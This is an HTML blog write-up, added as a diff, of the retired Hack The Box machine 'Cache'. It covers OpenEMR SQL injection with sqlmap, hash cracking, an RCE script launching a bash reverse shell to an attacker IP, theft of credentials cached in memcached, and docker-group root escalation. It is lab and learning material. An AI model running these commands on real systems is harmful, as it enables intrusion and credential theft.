@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html ⚡>
+<head>
+    <meta charset="utf-8">
+
+    <title>HTB Write-up | Cache</title>
+
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-write-up-cache/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    
+    <meta property="og:site_name" content="Inês Martins" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up | Cache" />
+    <meta property="og:description" content="Write-up for Cache, a retired HTB machine." />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-write-up-cache/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/10/cache.png" />
+    <meta property="article:published_time" content="2020-10-22T08:51:40.000Z" />
+    <meta property="article:modified_time" content="2020-11-27T23:04:41.000Z" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="linux" />
+    <meta property="article:tag" content="cache" />
+    <meta property="article:tag" content="memcached" />
+    <meta property="article:tag" content="privesc" />
+    <meta property="article:tag" content="docker" />
+    <meta property="article:tag" content="openemr" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up | Cache" />
+    <meta name="twitter:description" content="Write-up for Cache, a retired HTB machine." />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-write-up-cache/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/10/cache.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="htb, linux, cache, memcached, privesc, docker, openemr" />
+    <meta name="twitter:site" content="@inesmartns" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="380" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Inês Martins",
+        "url": "https://inesmartins.github.io//",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//content/images/2020/07/0PFUtbOg_400x400.jpg",
+            "width": 400,
+            "height": 400
+        },
+        "url": "https://inesmartins.github.io//author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up | Cache",
+    "url": "https://inesmartins.github.io//htb-write-up-cache/",
+    "datePublished": "2020-10-22T08:51:40.000Z",
+    "dateModified": "2020-11-27T23:04:41.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://inesmartins.github.io//content/images/2020/10/cache.png",
+        "width": 598,
+        "height": 380
+    },
+    "keywords": "htb, linux, cache, memcached, privesc, docker, openemr",
+    "description": "Write-up for Cache, a retired HTB machine.",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://inesmartins.github.io//"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.18" />
+    <link rel="alternate" type="application/rss+xml" title="Inês Martins" href="https://inesmartins.github.io//rss/" />
+
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic|Open+Sans:700,600,400" />
+    <style amp-custom>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,strong{font-weight:bold}dfn{font-style:italic}h1{margin:0.67em 0;font-size:2em}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{position:relative;vertical-align:baseline;font-size:75%;line-height:0}sup{top:-0.5em}sub{bottom:-0.25em}img{border:0}amp-img{border:0}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{margin:0;color:inherit;font:inherit}button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{cursor:pointer;-webkit-appearance:button}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{padding:0;border:0}input{line-height:normal}input[type="checkbox"],input[type="radio"]{box-sizing:border-box;padding:0}input[type="number"]::-webkit-inner-spin-button,input[type="number"]::-webkit-outer-spin-button{height:auto}input[type="search"]{-webkit-appearance:textfield}input[type="search"]::-webkit-search-cancel-button,input[type="search"]::-webkit-search-decoration{-webkit-appearance:none}fieldset{margin:0 2px;padding:0.35em 0.625em 0.75em;border:1px solid #c0c0c0}legend{padding:0;border:0}textarea{overflow:auto}optgroup{font-weight:bold}table{border-spacing:0;border-collapse:collapse}td,th{padding:0}html{max-height:100%;height:100%;font-size:62.5%;-webkit-tap-highlight-color:rgba(0,0,0,0)}body{max-height:100%;height:100%;color:#3a4145;background:#f4f8fb;letter-spacing:0.01rem;font-family:"Merriweather",serif;font-size:1.8rem;line-height:1.75em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"kern" 1;-moz-font-feature-settings:"kern" 1;-o-font-feature-settings:"kern" 1}::-moz-selection{background:#d6edff}::selection{background:#d6edff}h1,h2,h3,h4,h5,h6{margin:0 0 0.3em 0;color:#2e2e2e;font-family:"Open Sans",sans-serif;line-height:1.15em;text-rendering:geometricPrecision;-webkit-font-feature-settings:"dlig" 1,"liga" 1,"lnum" 1,"kern" 1;-moz-font-feature-settings:"dlig" 1,"liga" 1,"lnum" 1,"kern" 1;-o-font-feature-settings:"dlig" 1,"liga" 1,"lnum" 1,"kern" 1}h1{text-indent:-2px;letter-spacing:-1px;font-size:2.6rem}h2{letter-spacing:0;font-size:2.4rem}h3{letter-spacing:-0.6px;font-size:2.1rem}h4{font-size:1.9rem}h5{font-size:1.8rem}h6{font-size:1.8rem}a{color:#4a4a4a}a:hover{color:#111}p,ul,ol,dl{margin:0 0 2.5rem 0;font-size:1.5rem;text-rendering:geometricPrecision;-webkit-font-feature-settings:"liga" 1,"onum" 1,"kern" 1;-moz-font-feature-settings:"liga" 1,"onum" 1,"kern" 1;-o-font-feature-settings:"liga" 1,"onum" 1,"kern" 1}ol,ul{padding-left:2em}ol ol,ul ul,ul ol,ol ul{margin:0 0 0.4em 0;padding-left:2em}dl dt{float:left;clear:left;overflow:hidden;margin-bottom:1em;width:180px;text-align:right;text-overflow:ellipsis;white-space:nowrap;font-weight:700}dl dd{margin-bottom:1em;margin-left:200px}li{margin:0.4em 0}li li{margin:0}hr{display:block;margin:1.75em 0;padding:0;height:1px;border:0;border-top:#efefef 1px solid}blockquote{box-sizing:border-box;margin:1.75em 0 1.75em 0;padding:0 0 0 1.75em;border-left:#4a4a4a 0.4em solid;-moz-box-sizing:border-box}blockquote p{margin:0.8em 0;font-style:italic}blockquote small{display:inline-block;margin:0.8em 0 0.8em 1.5em;color:#ccc;font-size:0.9em}blockquote small:before{content:"\2014 \00A0"}blockquote cite{font-weight:700}blockquote cite a{font-weight:normal}mark{background-color:#fdffb6}code,tt{padding:1px 3px;border:#e3edf3 1px solid;background:#f7fafb;border-radius:2px;white-space:pre-wrap;font-family:Inconsolata,monospace,sans-serif;font-size:0.85em;font-feature-settings:"liga" 0;-webkit-font-feature-settings:"liga" 0;-moz-font-feature-settings:"liga" 0}pre{overflow:auto;box-sizing:border-box;margin:0 0 1.75em 0;padding:10px;width:100%;border:#e3edf3 1px solid;background:#f7fafb;border-radius:3px;white-space:pre;font-family:Inconsolata,monospace,sans-serif;font-size:0.9em;-moz-box-sizing:border-box}pre code,pre tt{padding:0;border:none;background:transparent;white-space:pre-wrap;font-size:inherit}kbd{display:inline-block;margin-bottom:0.4em;padding:1px 8px;border:#ccc 1px solid;background:#f4f4f4;border-radius:4px;box-shadow:0 1px 0 rgba(0,0,0,0.2),0 1px 0 0 #fff inset;color:#666;text-shadow:#fff 0 1px 0;font-size:0.9em;font-weight:700}table{box-sizing:border-box;margin:1.75em 0;max-width:100%;width:100%;background-color:transparent;-moz-box-sizing:border-box}table th,table td{padding:8px;border-top:#efefef 1px solid;vertical-align:top;text-align:left;line-height:20px}table th{color:#000}table caption + thead tr:first-child th,table caption + thead tr:first-child td,table colgroup + thead tr:first-child th,table colgroup + thead tr:first-child td,table thead:first-child tr:first-child th,table thead:first-child tr:first-child td{border-top:0}table tbody + tbody{border-top:#efefef 2px solid}table table table{background-color:#fff}table tbody > tr:nth-child(odd) > td,table tbody > tr:nth-child(odd) > th{background-color:#f6f6f6}table.plain tbody > tr:nth-child(odd) > td,table.plain tbody > tr:nth-child(odd) > th{background:transparent}iframe,amp-iframe,.fluid-width-video-wrapper{display:block;margin:1.75em 0}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper amp-iframe{margin:0}textarea,select,input{margin:0 0 5px 0;padding:6px 9px;width:260px;outline:0;border:#e7eef2 1px solid;background:#fff;border-radius:4px;box-shadow:none;font-family:"Open Sans",sans-serif;font-size:1.6rem;line-height:1.4em;font-weight:100;-webkit-appearance:none}textarea{min-width:250px;min-height:80px;max-width:340px;width:100%;height:auto}input[type="text"]:focus,input[type="email"]:focus,input[type="search"]:focus,input[type="tel"]:focus,input[type="url"]:focus,input[type="password"]:focus,input[type="number"]:focus,input[type="date"]:focus,input[type="month"]:focus,input[type="week"]:focus,input[type="time"]:focus,input[type="datetime"]:focus,input[type="datetime-local"]:focus,textarea:focus{outline:none;outline-width:0;border:#bbc7cc 1px solid;background:#fff}select{width:270px;height:30px;line-height:30px}.clearfix:before,.clearfix:after{content:" ";display:table}.clearfix:after{clear:both}.clearfix{zoom:1}.main-header{position:relative;display:table;overflow:hidden;box-sizing:border-box;width:100%;height:50px;background:#5ba4e5 no-repeat center center;background-size:cover;text-align:left;-webkit-box-sizing:border-box;-moz-box-sizing:border-box}.content{background:#fff;padding-top:15px}.blog-title,.content{margin:auto;max-width:600px}.blog-title a{display:block;padding-right:16px;padding-left:16px;height:50px;color:#fff;text-decoration:none;font-family:"Open Sans",sans-serif;font-size:16px;line-height:50px;font-weight:600}.post{position:relative;margin-top:0;margin-right:16px;margin-left:16px;padding-bottom:0;max-width:100%;border-bottom:#ebf2f6 1px solid;word-wrap:break-word;font-size:0.95em;line-height:1.65em}.post-header{margin-bottom:1rem}.post-title{margin-bottom:0}.post-title a{text-decoration:none}.post-meta{display:block;margin:3px 0 0 0;color:#9eabb3;font-family:"Open Sans",sans-serif;font-size:1.3rem;line-height:2.2rem}.post-meta a{color:#9eabb3;text-decoration:none}.post-meta a:hover{text-decoration:underline}.post-meta .author{margin:0;font-size:1.3rem;line-height:1.3em}.post-date{display:inline-block;text-transform:uppercase;white-space:nowrap;font-size:1.2rem;line-height:1.2em}.post-image{margin:0;padding-top:3rem;padding-bottom:30px;border-top:1px #E8E8E8 solid}.post-image img{object-fit:cover;}.post-content amp-img,.post-content amp-anim{position:relative;left:50%;display:block;padding:0;min-width:0;max-width:112%;width:calc(100% + 32px);height:auto;transform:translateX(-50%);-webkit-transform:translateX(-50%);-ms-transform:translateX(-50%)}.footnotes{font-size:1.3rem;line-height:1.6em;font-style:italic}.footnotes li{margin:0.6rem 0}.footnotes p{margin:0}.footnotes p a:last-child{text-decoration:none}.site-footer{position:relative;margin:0 auto 20px auto;padding:1rem 15px;max-width:600px;color:rgba(0,0,0,0.5);font-family:"Open Sans",sans-serif;font-size:1.1rem;line-height:1.75em}.site-footer a{color:rgba(0,0,0,0.5);text-decoration:none;font-weight:bold}.site-footer a:hover{border-bottom:#bbc7cc 1px solid}.poweredby{display:block;float:right;width:45%;text-align:right}.copyright{display:block;float:left;width:45%}</style>
+
+    <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+    <script async src="https://cdn.ampproject.org/v0.js"></script>
+
+    
+
+</head>
+
+<body class="amp-template">
+    <header class="main-header">
+        <nav class="blog-title">
+            <a href="https://inesmartins.github.io/">Inês Martins</a>
+        </nav>
+    </header>
+
+    <main class="content" role="main">
+        <article class="post">
+
+            <header class="post-header">
+                <h1 class="post-title">HTB Write-up | Cache</h1>
+                <section class="post-meta">
+                    <p class="author">by <a href="/author/ines/">Inês Martins</a></p>
+                    <time class="post-date" datetime="2020-10-22">2020-10-22</time>
+                </section>
+            </header>
+            <figure class="post-image">
+                <amp-img src="https://inesmartins.github.io//content/images/2020/10/cache.png" width="600" height="400" layout="responsive"></amp-img>
+            </figure>
+            <section class="post-content">
+
+                <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/251">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>We start with our usual scanning which finds only an instance of <code>OpenSSH</code> running on port 22 and an <code>Apache</code> server running on port 80.</p><pre><code>~ sudo nmap -sV -sC -A -T4 cache.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 18:21 WEST
+Nmap scan report for cache.htb (10.10.10.188)
+Host is up (0.042s latency).
+Not shown: 998 closed ports
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)
+|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)
+|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Cache
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</code></pre>
+<p>The website hosted on <code>cache.htb</code> is very simple: there are only a couple of HTML pages with some text about hacking.</p><figure class="kg-card kg-image-card"></figure><p>There's also a very simple <a href="http://cache.htb/login.html">Login page</a>:</p><figure class="kg-card kg-image-card"></figure><p>The credentials for this authentication form are hardcoded on a <a href="http://cache.htb/jquery/functionality.js">JS file</a>:</p><pre><code>user: ash
+password: H@v3_fun
+</code></pre>
+<p>Using these credentials on the form we're redirected to the <a href="http://cache.htb/net.html">Net page</a>, which doesn't seem to have anything of relevance.</p><figure class="kg-card kg-image-card"></figure><p>The <a href="http://cache.htb/author.html">Author page</a>, on the other hand, seems to have some interesting information:</p><pre><code class="language-html">&lt;div class="card"&gt;
+  &lt;img src="logo1.jpg" alt="John" style="width:100%"&gt;
+  &lt;h1&gt;ASH&lt;/h1&gt;
+  &lt;p class="title"&gt;CEO &amp; Founder, CACHE&lt;/p&gt;
+  &lt;a href="http://cache.htb"&gt;cache.htb&lt;/a&gt;
+  &lt;h3&gt;&lt;font color="Grey"&gt;ASH is a Security Researcher (Threat Research Labs), Security Engineer. Hacker, Penetration Tester and Security blogger. He is Editor-in-Chief, Author &amp; Creator of Cache. Check out his other projects like Cache:&lt;p&gt; HMS(Hospital Management System)
+&lt;/font&gt;&lt;/h3&gt; </code></pre><p>So, a couple of interesting things:</p><ul><li>the CEO and Founder of CACHE is someone named ASH (also maybe John according to the alt tag);</li><li>ASH is also the creator of another project called HMS;</li></ul><p>I was certain that HMS was an important clue, but wasn't completely sure how to access it. That is until I realised that it's possible to <strong>host multiple domains on the same Apache server </strong>which are accessible only when you navigate to the correct URL. So, in order to display this other website, all we have to do is change our <code>/etc/hosts</code> configuration:</p><pre><code>10.10.10.188 hms.htb
+</code></pre>
+<hr></hr><h2 id="exploiting-openemr-vulnerabilities">Exploiting OpenEMR Vulnerabilities</h2><p>When we access <a href="http://hms.htb/">hms.htb</a> we're redirected to a <a href="http://hms.htb/interface/login/login.php?site=default">login page</a> for <a href="https://www.open-emr.org/">OpenEMR</a>, which is an "open source electronic health records and medical practice management solution".</p><figure class="kg-card kg-image-card"></figure><p>Turns out OpenEMR has a lot of well-known vulnerabilities, which are very thoroughly detailed <a href="https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf">here</a>.</p><p>As indicated on these docs, we can check the <a href="http://hms.htb/admin.php">admin.php</a> file for the exact version of the application:</p><figure class="kg-card kg-image-card"></figure><p>This version is vulnerable to multiple SQL Injection vulnerabilities. There's actually a very good <a href="https://www.youtube.com/watch?time_continue=115&amp;v=DJSQ8Pk_7hc&amp;feature=emb_logo">video tutorial</a> for this exploit, but in very simple terms it works as follows:</p><ol><li>capture the GET request to a <a href="http://hms.htb/portal/add_edit_event_user.php">portal page</a> with <a href="https://portswigger.net/burp">Burp</a> or any other proxy;</li><li>copy that request to a file and then add a parameter (?eid=1) to the URL:</li></ol><pre><code>~ sudo nano openemr.req
+
+GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1
+Host: hms.htb
+Cache-Control: max-age=0
+DNT: 1
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9,pt-PT;q=0.8,pt;q=0.7
+Cookie: OpenEMR=ektggh73sf93fg6kg9ctif9km6; PHPSESSID=mff3bosse1qitlik842hl4ud4f
+Connection: close
+</code></pre>
+<p>3. use <a href="http://sqlmap.org/">sqlmap</a> to exploit the aforementioned SQL injection vulnerabilities, starting with the enumeration of the available databases:</p><pre><code>~ sqlmap -r openemr.req --threads=10 --dbs
+
+available databases [2]:
+[*] information_schema
+[*] openemr
+</code></pre>
+<p>4. once we have the database name, dump the contents of the <strong>users_secure</strong> table, which holds user info including passwords:</p><pre><code>~ sqlmap -r openemr.req --threads=10 -D openemr -T users_secure --dump
+</code></pre>
+<p>And voilà!<br />The users_secure table has only one user - <strong>openemr_admin</strong> - and now we know their hashed password, which we'll crack using john:</p><pre><code>$ john -w=rockyou.txt hash.txt 
+</code></pre>
+<p>Now that we have a valid user/password combination, we can use <a href="https://www.exploit-db.com/exploits/45161">this script</a> to help us get the RCE (it took a bit of tweaking to get the script to work, since the base64 encoding was not working properly):</p><pre><code>~ python3 openemr_rce.py http://hms.htb -u openemr_admin -p xxxxxx -c "bash -i &gt;&amp; /dev/tcp/10.10.14.43/4444 0&gt;&amp;1"
+</code></pre>
+<hr></hr><h2 id="getting-user">Getting user</h2><p>As always, we check the <code>/etc/passwd</code> file to check the system's users:</p><pre><code>www-data@cache:/$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+ash:x:1000:1000:ash:/home/ash:/bin/bash
+luffy:x:1001:1001:,,,:/home/luffy:/bin/bash
+memcache:x:111:114:Memcached,,,:/nonexistent:/bin/false
+mysql:x:112:115:MySQL Server,,,:/nonexistent:/bin/false
+</code></pre>
+<p>There are 2 interesting users: <strong>ash</strong> and <strong>luffy</strong>:</p><ul><li>ash we already know - they're the CEO of both Cache and HMS. </li><li>luffy, however, means nothing to us at this point (but this is the name of a <a href="https://en.wikipedia.org/wiki/One_Piece">OnePiece</a> character, which combined with the image on the <a href="http://10.10.10.188/net.html">Net page</a> page might be a little clue).</li></ul><hr></hr><h3 id="using-su">Using su</h3><p>We now have a couple of credentials that we want to test for both ash and luffy, however when we try to use <code>su</code>, we get the following error message:</p><pre><code>www-data@cache:/var/www/hms.htb/public_html$ su -u ash
+su -u ash
+su: must be run from a terminal
+</code></pre>
+<p>After some Googling I realised that this means this machine is running inside a<a href="https://www.docker.com/"> </a>container. <a href="https://stackoverflow.com/questions/36944634/su-command-in-docker-returns-must-be-run-from-terminal">This StackOverflow answer</a> helped me go around it by using a <a href="https://netsec.ws/?p=337">TTY shell</a>:</p><pre><code>www-data@cache:$ echo "import pty; pty.spawn('/bin/bash')" &gt; /tmp/abc.py
+www-data@cache:$ python3 /tmp/abc.py
+www-data@cache:$ rm /tmp/abc.py
+www-data@cache:$ su - ash
+Password: H@v3_fun
+ash@cache:~$ 
+</code></pre>
+<hr></hr><h2 id="becoming-luffy">Becoming luffy</h2><p>From our initial enumeration we know that luffy is a member of the <code>docker</code> group, so it's likely that we first need to become luffy before being able to escalate to root.</p><p>So, we start by checking all the services running on the machine:</p><pre><code>ash@cache:~/$ service --status-all
+
+ [ - ]  acpid
+ [ + ]  apache-htcacheclean
+ [ + ]  apache2
+ [ + ]  apparmor
+ [ + ]  apport
+ [ + ]  atd
+ [ - ]  console-setup.sh
+ [ + ]  cron
+ [ - ]  cryptdisks
+ [ - ]  cryptdisks-early
+ [ + ]  dbus
+ [ + ]  docker
+ [ + ]  ebtables
+ [ + ]  grub-common
+ [ - ]  hwclock.sh
+ [ + ]  irqbalance
+ [ + ]  iscsid
+ [ - ]  keyboard-setup.sh
+ [ + ]  kmod
+ [ - ]  lvm2
+ [ + ]  lvm2-lvmetad
+ [ + ]  lvm2-lvmpolld
+ [ + ]  lxcfs
+ [ - ]  lxd
+ [ - ]  mdadm
+ [ - ]  mdadm-waitidle
+ [ + ]  memcached
+ [ + ]  mysql
+ [ - ]  open-iscsi
+ [ + ]  open-vm-tools
+ [ - ]  plymouth
+ [ - ]  plymouth-log
+ [ + ]  procps
+ [ - ]  rsync
+ [ + ]  rsyslog
+ [ - ]  screen-cleanup
+ [ + ]  ssh
+ [ + ]  udev
+ [ + ]  ufw
+ [ + ]  unattended-upgrades
+ [ - ]  uuidd
+</code></pre>
+<p>Because of the name of the machine I decided to start by checking out the process in which <a href="https://memcached.org/">memcached</a> is running:</p><pre><code>ash@cache:~$ ps aux | grep memcached
+
+memcache   961  0.0  0.0 425792  4032 ?        Ssl  14:07   0:02 /usr/bin/memcached -m 64 -p 11211 -u memcache -l 127.0.0.1 -P /var/run/memcached/memcached.pid
+ash       7525  0.0  0.0 416308  2480 pts/5    Sl+  16:25   0:00 memcached
+ash       8590  0.0  0.0  13136  1048 pts/6    S+   16:27   0:00 grep --color=auto memcached
+</code></pre>
+<blockquote>Memcached is an in-memory key-value store for small chunks of arbitrary data (strings, objects) from results of database calls, API calls, or page rendering. (...) [It's] intended for use in speeding up dynamic web applications by alleviating database load. [<a href="https://memcached.org/">Source</a>]</blockquote><p>Now that we know the port this service is using, let's see if there's anything useful cached on the server:</p><pre><code>ash@cache:~$ nc 127.0.0.1 11211
+nc 127.0.0.1 11211
+stats items
+stats items
+STAT items:1:number 5
+STAT items:1:number_hot 0
+STAT items:1:number_warm 0
+STAT items:1:number_cold 5
+STAT items:1:age_hot 0
+STAT items:1:age_warm 0
+STAT items:1:age 20
+STAT items:1:evicted 0
+STAT items:1:evicted_nonzero 0
+STAT items:1:evicted_time 0
+STAT items:1:outofmemory 0
+STAT items:1:tailrepairs 0
+STAT items:1:reclaimed 0
+STAT items:1:expired_unfetched 0
+STAT items:1:evicted_unfetched 0
+STAT items:1:evicted_active 0
+STAT items:1:crawler_reclaimed 0
+STAT items:1:crawler_items_checked 72
+STAT items:1:lrutail_reflocked 0
+STAT items:1:moves_to_cold 895
+STAT items:1:moves_to_warm 0
+STAT items:1:moves_within_lru 0
+STAT items:1:direct_reclaims 0
+STAT items:1:hits_to_hot 0
+STAT items:1:hits_to_warm 0
+STAT items:1:hits_to_cold 2
+STAT items:1:hits_to_temp 0
+END
+</code></pre>
+<p>We know there's only 1 item, let's see what it contains:</p><pre><code>stats cachedump 1 1000
+ITEM link [21 b; 0 s]
+ITEM user [5 b; 0 s]
+ITEM passwd [9 b; 0 s]
+ITEM file [7 b; 0 s]
+ITEM account [9 b; 0 s]
+END
+```</code></pre>
+<p>Seems very interesting, let's print the values:</p><pre><code>get user
+get user
+VALUE user 0 5
+luffy
+END
+
+get passwd
+get passwd
+VALUE passwd 0 9
+0n3_p1ec3
+END
+</code></pre>
+<p>And there we go! We're now luffy!</p><hr></hr><h2 id="getting-root">Getting root</h2><p>Knowing that luffy is a part of the docker group we only need a bit of googling to find a potential priv esc path:</p><blockquote>The problem arises when the docker group is assigned to the host user. Since docker is running as root with SGID, an unauthorised person who has access to the host user (with user privileges) can easily escalate privileges by mounting the host volume to one of the containers; granting the attacker full access to the filesystem. [<a href="https://root4loot.com/post/docker-privilege-escalation/">Source</a>]</blockquote><p>So, as specified on the article, we start by listing the available containers:</p><pre><code>luffy@cache:~$ docker container ps
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>CONTAINER ID</th>
+<th>IMAGE</th>
+<th>COMMAND</th>
+<th>CREATED</th>
+<th>STATUS</th>
+<th>PORTS</th>
+<th>NAMES</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>9c0e13e441d3</td>
+<td>ubuntu</td>
+<td>"chroot /mnt sh"</td>
+<td>36 minutes ago</td>
+<td>Up 36 minutes</td>
+<td></td>
+<td>relaxed_ishizaka</td>
+</tr>
+<tr>
+<td>be4e9f712cb2</td>
+<td>ubuntu</td>
+<td>"chroot /mnt sh"</td>
+<td>4 hours ago</td>
+<td>Up 4 hours</td>
+<td></td>
+<td>heuristic_pasteur</td>
+</tr>
+</tbody>
+</table>
+<p>There's only 1 image we can run: <strong>ubuntu</strong>. Now we can mount our machine's entire filesystem on a new container (by specifying the <code>-v</code> argument) and then spawn a TTY to access it.</p><pre><code>luffy@cache:~$ docker run -v /:/mnt/root -ti ubuntu
+</code></pre>
+<p>Since we're root, we can print the root flag from its relative path to the mount point.</p><pre><code>root@a5d39b0a924a:/# cat /mnt/root/root/root.txtcat 
+</code></pre>
+<hr></hr>
+
+            </section>
+
+        </article>
+    </main>
+    <footer class="site-footer clearfix">
+        <section class="copyright"><a href="https://inesmartins.github.io/">Inês Martins</a> &copy; 2020</section>
+        <section class="poweredby">Proudly published with <a href="https://ghost.org">Ghost</a></section>
+    </footer>
+</body>
+</html>
